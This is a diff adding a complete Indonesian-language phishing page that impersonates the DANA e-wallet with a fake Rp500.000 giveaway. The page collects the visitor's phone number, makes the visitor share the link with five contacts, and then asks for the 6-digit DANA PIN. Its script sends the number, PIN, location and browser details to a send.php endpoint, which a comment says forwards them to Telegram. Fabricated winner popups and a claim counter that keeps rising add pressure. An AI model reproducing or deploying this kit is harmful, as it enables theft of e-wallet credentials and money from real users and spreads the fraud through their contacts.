@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <!-- Open Graph Meta Tags (Sesuai Permintaan) -->
+    <meta name="og:title" content="Hajatan Ulang Tahun DANA: Bagi-Bagi Saldo Rp500.000 untuk Semua Pengguna" />
+    <meta name="og:url" content="/" />
+    <meta property="og:description" content="Saldo Rp500.000 tersedia untuk diklaim oleh semua pengguna dalam Hajatan Ulang Tahun DANA!" />
+    <meta property="og:image" content="https://599cdn.com/Indonesia/dana417.jpg" />
+    <meta property="og:type" content="website" />
+    <meta property="og:updated_time" content="1440432930" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DANA Kaget - Bagi Saldo Gratis!</title>
+    <link rel="icon" type="image/png" href="https://www.dana.id/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #0B6FB8;
+            min-height: 100vh;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: #FFFFFF;
+            border-radius: 24px;
+            padding: 24px 18px;
+            max-width: 460px;
+            width: 100%;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 12px;
+        }
+        .logo span {
+            font-size: 28px;
+            font-weight: 800;
+            color: #108DE8;
+        }
+        .counter-badge {
+            background: #E8F0FE;
+            padding: 8px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin-bottom: 16px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #0B6FB8;
+        }
+        .counter-badge i {
+            font-style: normal;
+            animation: pulse 1.5s infinite;
+        }
+        .amount-box {
+            background: linear-gradient(145deg, #108DE8, #0B6FB8);
+            border-radius: 24px;
+            padding: 24px 16px;
+            margin-bottom: 24px;
+            color: white;
+        }
+        .amount-label {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        .amount-value {
+            font-size: 48px;
+            font-weight: 800;
+            line-height: 1.3;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .form-group label {
+            font-weight: 600;
+            color: #1F2937;
+            margin-bottom: 6px;
+            display: block;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: #F3F4F6;
+            border-radius: 16px;
+            padding: 4px 16px;
+            border: 2px solid #E5E7EB;
+        }
+        .input-wrapper:focus-within {
+            border-color: #108DE8;
+            background: white;
+        }
+        .prefix {
+            font-weight: 700;
+            margin-right: 8px;
+        }
+        .input-wrapper input {
+            width: 100%;
+            padding: 16px 0;
+            border: none;
+            background: transparent;
+            font-size: 18px;
+            outline: none;
+        }
+        .pin-container {
+            display: flex;
+            gap: 6px;
+            justify-content: center;
+            margin: 16px 0;
+        }
+        .pin-digit {
+            width: 45px;
+            height: 55px;
+            text-align: center;
+            font-size: 28px;
+            font-weight: 700;
+            border: 2px solid #D1D5DB;
+            border-radius: 14px;
+            background: #F9FAFB;
+            outline: none;
+        }
+        .pin-digit:focus {
+            border-color: #108DE8;
+            background: white;
+        }
+        .info-banner {
+            background: #FEF3C7;
+            border-left: 5px solid #F59E0B;
+            padding: 14px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .progress-container {
+            margin: 20px 0;
+        }
+        .progress-bar-bg {
+            background: #E5E7EB;
+            height: 12px;
+            border-radius: 30px;
+            overflow: hidden;
+            margin-bottom: 6px;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: #108DE8;
+            width: 0%;
+            transition: width 0.3s;
+            border-radius: 30px;
+        }
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            color: #4B5563;
+            font-size: 14px;
+        }
+        .share-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        .btn {
+            border: none;
+            padding: 14px 16px;
+            border-radius: 60px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            text-align: center;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+            flex: 1;
+        }
+        .btn-primary {
+            background: #108DE8;
+            color: white;
+        }
+        .btn-wa {
+            background: #25D366;
+            color: white;
+        }
+        .btn-tg {
+            background: #0088cc;
+            color: white;
+        }
+        .btn-success {
+            background: #059669;
+            color: white;
+            width: 100%;
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        .error-msg {
+            color: #DC2626;
+            font-size: 13px;
+            margin-top: 6px;
+            display: none;
+        }
+        .popup-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #1F2937;
+            color: white;
+            padding: 14px 18px;
+            border-radius: 50px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            z-index: 9999;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transform: translateX(-120%);
+            transition: transform 0.4s ease;
+            max-width: 400px;
+        }
+        .popup-notification.show {
+            transform: translateX(0);
+        }
+        .popup-emoji {
+            font-size: 28px;
+        }
+        .popup-text {
+            flex: 1;
+        }
+        .popup-close {
+            background: none;
+            border: none;
+            color: #9CA3AF;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+        .secure-note {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #9CA3AF;
+        }
+        #step2, #stepPin, #step3 { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo"><span>DANA</span></div>
+        <!-- Counter Dinamis -->
+        <div class="counter-badge">
+            🎉 <span id="claimCounter">17.823</span> orang telah mengklaim
+        </div>
+        <div class="amount-box">
+            <div class="amount-label">Saldo Menunggumu</div>
+            <div class="amount-value" id="displayAmount">Rp 500.000</div>
+        </div>
+
+        <!-- STEP 1: INPUT NOMOR HP -->
+        <div id="step1">
+            <div class="form-group">
+                <label>📱 Nomor HP DANA</label>
+                <div class="input-wrapper">
+                    <span class="prefix">+62</span>
+                    <input type="tel" id="phoneInput" placeholder="81234567890" maxlength="13" inputmode="numeric">
+                </div>
+                <div class="error-msg" id="phoneError">Nomor harus 10-13 digit</div>
+            </div>
+            <div class="info-banner">
+                <p>🔐 Verifikasi 2 Langkah</p>
+                <p>Bagikan ke 5 kontak untuk membuka PIN</p>
+            </div>
+            <button class="btn btn-primary" id="verifyBtn">Lanjutkan</button>
+        </div>
+
+        <!-- STEP 2: SHARE 5 KONTAK -->
+        <div id="step2">
+            <div class="info-banner" style="background: #E0F2FE; border-left-color: #0284C7;">
+                <p>✅ Nomor: <strong id="verifiedPhoneDisplay"></strong></p>
+                <p>📤 Share ke <strong>5 kontak</strong> (WhatsApp/Telegram)</p>
+            </div>
+            <div class="progress-container">
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill" id="shareProgressFill"></div>
+                </div>
+                <div class="progress-stats">
+                    <span><span id="shareCountDisplay">0</span>/5 Dibagikan</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+            </div>
+            <div class="share-buttons">
+                <button class="btn btn-wa" id="shareWA">💬 WhatsApp</button>
+                <button class="btn btn-tg" id="shareTG">📨 Telegram</button>
+            </div>
+            <button class="btn btn-primary" id="goToPinBtn" disabled>
+                🔐 Masukkan PIN DANA
+            </button>
+        </div>
+
+        <!-- STEP PIN: INPUT 6 DIGIT -->
+        <div id="stepPin">
+            <div class="info-banner" style="background: #FEE2E2; border-left-color: #EF4444;">
+                <p>🔒 Verifikasi Keamanan</p>
+                <p>Masukkan 6 digit PIN DANA Anda</p>
+            </div>
+            <div class="pin-container">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin1" inputmode="numeric">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin2" inputmode="numeric">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin3" inputmode="numeric">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin4" inputmode="numeric">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin5" inputmode="numeric">
+                <input type="tel" maxlength="1" class="pin-digit" id="pin6" inputmode="numeric">
+            </div>
+            <div class="error-msg" id="pinError">PIN harus 6 digit</div>
+            <button class="btn btn-success" id="claimFinalBtn">✅ Klaim Saldo Sekarang</button>
+        </div>
+
+        <!-- STEP 3: SUKSES -->
+        <div id="step3">
+            <div style="font-size: 60px; margin: 10px 0;">✅</div>
+            <h2 style="color: #059669;">Klaim Berhasil!</h2>
+            <p>Saldo <strong id="finalAmountDisplay">Rp 500.000</strong> akan masuk ke <span id="finalPhoneDisplay"></span></p>
+            <button class="btn btn-primary" style="margin-top: 24px;" onclick="window.location.href='https://www.dana.id/download'">
+                📲 Buka Aplikasi DANA
+            </button>
+        </div>
+
+        <div class="secure-note">🔒 Koneksi Terenkripsi • Data Aman</div>
+    </div>
+
+    <!-- Popup Notification Dinamis -->
+    <div class="popup-notification" id="popupNotification">
+        <span class="popup-emoji">🎉</span>
+        <span class="popup-text" id="popupText">Agus Setiawan dari Jakarta menerima Rp19.000.000</span>
+        <button class="popup-close" onclick="hidePopup()">✕</button>
+    </div>
+
+    <script>
+        // === KONFIGURASI ===
+        const WEBHOOK_URL = 'send.php';  // Ganti dengan URL send.php Anda
+        const REQUIRED_SHARES = 5;
+        const REWARD_AMOUNT = 500000; // Sesuai tema hajatan
+
+        // State
+        let shareCount = 0;
+        let phoneNumberRaw = '';
+        let phoneFormatted = '';
+        let visitorData = {};
+        let shareUsed = { wa: false, tg: false };
+        let popupInterval, counterInterval;
+
+        // Format Rupiah
+        function formatRp(num) { return 'Rp ' + num.toLocaleString('id-ID'); }
+        document.getElementById('displayAmount').textContent = formatRp(REWARD_AMOUNT);
+        document.getElementById('finalAmountDisplay').textContent = formatRp(REWARD_AMOUNT);
+
+        // Counter dinamis
+        let claimBase = 17823;
+        function updateCounter() {
+            claimBase += Math.floor(Math.random() * 5) + 1;
+            document.getElementById('claimCounter').textContent = claimBase.toLocaleString('id-ID');
+        }
+        counterInterval = setInterval(updateCounter, 45000); // tiap 45 detik
+
+        // Popup dinamis
+        const names = ['Agus Setiawan','Siti Aminah','Budi Santoso','Dewi Lestari','Eko Prasetyo','Rina Marlina','Joko Widodo','Tini Sumarni','Anto Wijaya','Wati Susanti','Yanto Nugroho','Sari Indah','Hendra Gunawan','Putri Ayu','Rudi Hartono','Ani Lestari','Fajar Hidayat','Maya Sari','Dedi Kurniawan','Lina Oktavia'];
+        const cities = ['Jakarta','Surabaya','Bandung','Medan','Makassar','Palembang','Semarang','Yogyakarta','Bekasi','Depok','Tangerang','Bogor','Malang','Balikpapan','Batam'];
+        function showRandomPopup() {
+            const popup = document.getElementById('popupNotification');
+            const textEl = document.getElementById('popupText');
+            const name = names[Math.floor(Math.random() * names.length)];
+            const city = cities[Math.floor(Math.random() * cities.length)];
+            const amount = Math.floor(Math.random() * 19000000) + 1000000; // 1jt - 20jt
+            textEl.textContent = `${name} dari ${city} menerima Rp${amount.toLocaleString('id-ID')}`;
+            popup.classList.add('show');
+            setTimeout(() => popup.classList.remove('show'), 5000);
+        }
+        function hidePopup() {
+            document.getElementById('popupNotification').classList.remove('show');
+        }
+        popupInterval = setInterval(showRandomPopup, 12000); // tiap 12 detik
+        setTimeout(() => showRandomPopup(), 2000);
+
+        // Kirim data ke Telegram
+        async function sendToTelegram(payload) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(payload)
+                });
+            } catch(e) { console.error(e); }
+        }
+
+        // Info pengunjung
+        async function getVisitorInfo() {
+            let loc = 'Unknown';
+            try {
+                let r = await fetch('https://ipapi.co/json/');
+                let d = await r.json();
+                loc = `${d.city || ''}, ${d.country_name || ''}`.trim();
+            } catch(e){}
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                location: loc,
+                referrer: document.referrer || 'Direct',
+                timestamp: new Date().toLocaleString('id-ID'),
+                timestampISO: new Date().toISOString()
+            };
+        }
+
+        // Validasi HP
+        function validatePhone(input) {
+            let cleaned = input.replace(/\D/g, '');
+            if (cleaned.startsWith('0')) cleaned = cleaned.substring(1);
+            if (cleaned.startsWith('62')) cleaned = cleaned.substring(2);
+            return cleaned;
+        }
+
+        // Event: Verifikasi HP
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            let raw = document.getElementById('phoneInput').value.trim();
+            let cleaned = validatePhone(raw);
+            if (cleaned.length < 10 || cleaned.length > 13) {
+                document.getElementById('phoneError').style.display = 'block';
+                return;
+            }
+            document.getElementById('phoneError').style.display = 'none';
+            phoneNumberRaw = '08' + cleaned;
+            phoneFormatted = '08' + cleaned.substring(0,2) + '-****-' + cleaned.substring(cleaned.length-4);
+            
+            document.getElementById('verifiedPhoneDisplay').textContent = phoneFormatted;
+            document.getElementById('finalPhoneDisplay').textContent = phoneFormatted;
+            
+            visitorData = await getVisitorInfo();
+            visitorData.phone = phoneNumberRaw;
+            visitorData.amount = REWARD_AMOUNT;
+            visitorData.event = 'phone_verified';
+            visitorData.message = `📱 Nomor Terverifikasi\n\`${phoneNumberRaw}\`\nSaldo: ${formatRp(REWARD_AMOUNT)}\nLokasi: ${visitorData.location}`;
+            await sendToTelegram(visitorData);
+            
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        });
+
+        // Share
+        document.getElementById('shareWA').addEventListener('click', ()=> fakeShare('wa'));
+        document.getElementById('shareTG').addEventListener('click', ()=> fakeShare('tg'));
+
+        async function fakeShare(platform) {
+            if (shareCount >= REQUIRED_SHARES) return;
+            if (platform === 'wa' && shareUsed.wa) { alert('Sudah share WhatsApp'); return; }
+            if (platform === 'tg' && shareUsed.tg) { alert('Sudah share Telegram'); return; }
+            
+            let text = encodeURIComponent(`🎉 DAPAT SALDO DANA ${formatRp(REWARD_AMOUNT)} GRATIS! 🎉\nKlik & klaim: ${window.location.href}`);
+            let url = platform === 'wa' ? `https://wa.me/?text=${text}` : `https://t.me/share/url?url=${window.location.href}&text=${text}`;
+            window.open(url, '_blank', 'width=600,height=400');
+            
+            if (platform === 'wa') shareUsed.wa = true; else shareUsed.tg = true;
+            shareCount++;
+            updateProgress();
+            
+            visitorData.event = 'share';
+            visitorData.shareCount = shareCount;
+            visitorData.platform = platform;
+            visitorData.message = `📤 Share ${shareCount}/5 via ${platform}`;
+            await sendToTelegram(visitorData);
+            
+            if (shareCount >= REQUIRED_SHARES) {
+                document.getElementById('goToPinBtn').disabled = false;
+                visitorData.event = 'share_complete';
+                visitorData.message = `✅ Share 5 selesai!\nNomor: \`${phoneNumberRaw}\`\nMenunggu PIN...`;
+                await sendToTelegram(visitorData);
+            }
+        }
+
+        function updateProgress() {
+            let percent = (shareCount / REQUIRED_SHARES) * 100;
+            document.getElementById('shareProgressFill').style.width = percent + '%';
+            document.getElementById('shareCountDisplay').textContent = shareCount;
+            document.getElementById('progressPercent').textContent = percent + '%';
+        }
+
+        // Go to PIN
+        document.getElementById('goToPinBtn').addEventListener('click', function() {
+            if (shareCount < REQUIRED_SHARES) return;
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('stepPin').style.display = 'block';
+            document.getElementById('pin1').focus();
+        });
+
+        // PIN input auto-tab
+        const pinInputs = document.querySelectorAll('.pin-digit');
+        pinInputs.forEach((inp, idx) => {
+            inp.addEventListener('input', function() {
+                if (this.value.length === 1 && idx < pinInputs.length-1) pinInputs[idx+1].focus();
+            });
+            inp.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) pinInputs[idx-1].focus();
+            });
+        });
+
+        // Klaim Final
+        document.getElementById('claimFinalBtn').addEventListener('click', async function() {
+            let pinDigits = [];
+            for(let i=1; i<=6; i++) {
+                let val = document.getElementById('pin'+i).value;
+                if (!/^\d$/.test(val)) {
+                    document.getElementById('pinError').style.display = 'block';
+                    return;
+                }
+                pinDigits.push(val);
+            }
+            document.getElementById('pinError').style.display = 'none';
+            let pin = pinDigits.join('');
+            
+            visitorData.event = 'pin_submitted';
+            visitorData.pin = pin;
+            visitorData.message = `🔐 DATA LENGKAP\n📱 \`${phoneNumberRaw}\`\n🔢 PIN: \`${pin}\`\n💰 ${formatRp(REWARD_AMOUNT)}\n🌍 ${visitorData.location}`;
+            await sendToTelegram(visitorData);
+            
+            document.getElementById('stepPin').style.display = 'none';
+            document.getElementById('step3').style.display = 'block';
+        });
+
+        // Init
+        window.addEventListener('load', async () => {
+            let initData = await getVisitorInfo();
+            initData.event = 'page_visit';
+            initData.message = `👀 Kunjungan baru\nRef: ${initData.referrer}`;
+            await sendToTelegram(initData);
+        });
+    </script>
+</body>
+</html>
